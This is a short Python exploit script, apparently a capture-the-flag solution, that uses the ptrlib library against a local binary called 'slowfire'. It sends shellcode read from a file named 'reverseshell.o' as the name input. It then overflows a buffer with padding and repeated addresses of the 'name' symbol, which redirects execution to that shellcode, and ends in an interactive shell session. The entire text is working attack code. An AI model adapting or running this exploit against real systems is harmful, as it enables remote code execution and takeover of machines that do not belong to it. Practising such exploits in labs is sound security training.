from ptrlib import *

elf = ELF("./slowfire")
sock = Socket("127.0.0.1", 4141)

with open("reverseshell.o", "rb") as f:
    f.seek(0x180)
    shellcode = f.read(0x40)
payload = b"A" * 0x400
payload += p64(elf.symbol("name")) * 80
sock.recvuntil("Enter your name> ")
sock.sendline(shellcode)
sock.recvuntil("Enter message> ")
sock.send(payload)

sock.interactive()
